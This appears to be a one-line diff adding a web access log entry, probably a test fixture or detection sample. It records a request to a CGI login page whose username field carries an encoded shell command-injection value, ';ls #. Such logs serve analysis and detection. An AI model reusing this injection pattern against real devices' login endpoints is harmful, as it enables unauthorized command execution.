@@ -1,0 +1,1 @@
+112.197.45.222 - - [23/Apr/2020:00:31:03 +0300] "GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bls%20%23&password=asdf HTTP/1.1" 301 162 "-" "-" "Mozilla/5.0"
